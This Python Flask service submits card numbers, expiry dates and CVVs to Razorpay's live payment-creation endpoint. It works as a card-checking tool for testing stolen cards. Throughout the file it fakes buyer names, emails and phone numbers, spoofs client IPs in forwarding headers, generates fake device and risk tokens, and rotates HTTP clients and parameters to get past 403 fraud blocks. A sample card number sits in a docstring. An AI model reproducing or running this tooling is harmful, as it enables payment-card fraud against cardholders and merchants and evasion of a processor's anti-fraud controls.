import os
import random
import time
import json
import base64
import hashlib
import uuid
import string
import requests
import httpx
from curl_cffi import requests as curl_requests
from flask import Flask, request, jsonify
from faker import Faker
from user_agent import generate_user_agent

app = Flask(__name__)
fake = Faker()

# ---------------------------------------------------------------------
# Helper functions
# ---------------------------------------------------------------------

def generate_risk_token():
    session_id = ''.join(random.choices(string.ascii_letters + string.digits, k=14))
    payload = [{"name": "sardine", "metadata": {"session_id": session_id}}]
    json_data = json.dumps(payload, separators=(',', ':'))
    return base64.b64encode(json_data.encode()).decode()

def generate_device_id():
    sha1_hex = hashlib.sha1(os.urandom(20)).hexdigest()
    epoch_ms = int(time.time() * 1000)
    rand8 = str(random.randint(0, 99999999)).zfill(8)
    return f"1.{sha1_hex}.{epoch_ms}.{rand8}"

def generate_random_headers(keyless_header, session_token, build, build_v1, device_id, agent, ip):
    return {
        'Accept': '*/*',
        'Accept-Language': 'en-IN',
        'Connection': 'keep-alive',
        'Content-type': 'application/x-www-form-urlencoded',
        'Origin': 'https://api.razorpay.com',
        'Referer': f'https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={build}&build_v1={build_v1}&keyless_header={keyless_header}&rzp_device_id={device_id}',
        'User-Agent': agent,
        'x-session-token': session_token,
        "X-Forwarded-For": ip,
        "X-Client-IP": ip,
        "X-Real-IP": ip,
        "X-Remote-Addr": ip,
        "Via": ip,
    }

# ---------------------------------------------------------------------
# Core payment request with fallback
# ---------------------------------------------------------------------

def attempt_payment(
    payment_link_id,
    order_id,
    card,                # "num|mes|ano|cvv"
    amount,
    rzp_live,
    session_token,
    keyless_header,
    max_attempts=3
):
    """
    Tries multiple client+parameter combinations to avoid 403.
    Returns (payment_id, full_response_json) on success, raises Exception on failure.
    """
    # Prepare dynamic data
    num, mes, ano, cvv = map(str.strip, card.split("|"))
    device_id = generate_device_id()
    build = str(uuid.uuid4().hex)
    build_v1 = str(uuid.uuid4().hex)
    f_name = fake.first_name()
    l_name = fake.last_name()
    digits = random.randint(100, 999)
    email = f"{f_name}{l_name}{digits}@gmail.com"
    number = f"97{''.join(random.choices(string.digits, k=8))}"
    agent = generate_user_agent()
    ip = '.'.join(str(random.randint(1, 255)) for _ in range(4))
    risk_token = generate_risk_token()

    base_headers = generate_random_headers(
        keyless_header, session_token, build, build_v1, device_id, agent, ip
    )

    base_params = {
        'session_token': session_token,
        'keyless_header': keyless_header,
    }

    base_data = {
        'payment_link_id': payment_link_id,
        'contact': f'+91{number}',
        'email': email,
        'currency': 'INR',
        'amount': str(amount),
        'order_id': order_id,
        'user_risk_providers_token': risk_token,
        'method': 'card',
        'card[number]': num,
        'card[cvv]': cvv,
        'card[name]': f'{f_name} {l_name}',
        'card[expiry_month]': mes,
        'card[expiry_year]': ano,
        'save': '0',
        'billing_address[country]': 'US',
        'billing_address[postal_code]': '10010',
        'billing_address[city]': 'New York',
        'billing_address[state]': 'New York',
        'billing_address[line1]': 'New York',
        'billing_address[line2]': 'New York',
        'fee': '0',
        'dcc_currency': 'INR',
		'_[os]': 'android',
    }

    # Parameter toggles: (use_key_id, use_x_entity, use_shield)
    combos = [
        (True, False, True),   # default
        (False, False, True),
        (True, False, False),
        (False, False, False),
        (False, True, True),
        (False, True, False),
        (True, True, True),
        (True, True, False),
    ]

    clients = [
        ("requests", lambda url, data, headers, params: requests.post(url, params=params, data=data, headers=headers, timeout=10)),
        ("httpx", lambda url, data, headers, params: httpx.post(url, params=params, data=data, headers=headers, timeout=10)),
        ("curl_cffi", lambda url, data, headers, params: curl_requests.post(url, params=params, data=data, headers=headers, timeout=10)),
    ]

    random.shuffle(combos)
    random.shuffle(clients)

    for attempt in range(max_attempts):
        for use_key_id, use_x_entity, use_shield in combos:
            # Build params
            params = base_params.copy()
            if use_key_id:
                params['key_id'] = rzp_live
            if use_x_entity:
                params['x_entity_id'] = order_id

            # Build data
            data = base_data.copy()
            if use_shield:
                data['_[shield_context]'] = '0'
            else:
                data.pop('_[shield_context]', None)   # instead of data.pop('_shield_context', None)

            for client_name, send_func in clients:
                try:
                    resp = send_func(
                        'https://api.razorpay.com/v1/standard_checkout/payments/create/ajax',
                        data, base_headers, params
                    )
                    print(resp.text)
					
                    if "International" in resp.text:
                    	return "Declined ❌", "International cards not supported."
                    	
                    if resp.status_code == 200:
                        resp_json = resp.json()
                        payment_id = resp_json.get('payment_id') or resp_json.get('razorpay_payment_id')
                        if payment_id:
                            return payment_id, resp_json
                    # else continue
                except Exception:
                    continue
        # If we exhausted all combos/clients, wait and retry
        if attempt < max_attempts - 1:
            time.sleep(0.5)
			#pass

    raise Exception("All payment creation attempts failed (403 or other errors).")

# ---------------------------------------------------------------------
# Flask endpoints
# ---------------------------------------------------------------------
@app.route("/",methods=["GET"])
def welcome():
	return "Hello World!!!"

@app.route('/create_payment', methods=['POST'])
def create_payment():
    """
    Expects JSON:
    {
        "payment_link_id": "pl_...",
        "order_id": "order_...",
        "card": "4232230140804621|01|29|354",
        "amount": 100,
        "rzp_live": "rzp_live_...",
        "session_token": "...",
        "keyless_header": "...",
        "max_attempts": 3   (optional)
    }
    Returns:
    {
        "success": true,
        "payment_id": "pay_...",
        "response": { ... }   // full JSON from Razorpay
    }
    or on error:
    {
        "success": false,
        "error": "Error message"
    }
    """
    try:
        data = request.get_json()
        required = ['payment_link_id', 'order_id', 'card', 'amount', 'rzp_live', 'session_token', 'keyless_header']
        missing = [f for f in required if f not in data]
        if missing:
            return jsonify({"success": False, "error": f"Missing fields: {', '.join(missing)}"}), 400

        payment_link_id = data['payment_link_id']
        order_id = data['order_id']
        card = data['card']
        amount = int(data['amount'])
        rzp_live = data['rzp_live']
        session_token = data['session_token']
        keyless_header = data['keyless_header']
        max_attempts = data.get('max_attempts', 3)

        payment_id, resp_json = attempt_payment(
            payment_link_id=payment_link_id,
            order_id=order_id,
            card=card,
            amount=amount,
            rzp_live=rzp_live,
            session_token=session_token,
            keyless_header=keyless_header,
            max_attempts=max_attempts
        )
        if "Declined" in payment_id:
        	return jsonify({
        		"success": False,
        		"response": "International cards not supported."
        	}), 400

        return jsonify({
            "success": True,
            "payment_id": payment_id,
            "response": resp_json
        }), 200

    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

if __name__ == '__main__':
    port = int(os.enviro.get("PORT",5000))
    app.run(host='0.0.0.0', port=port, debug=False)
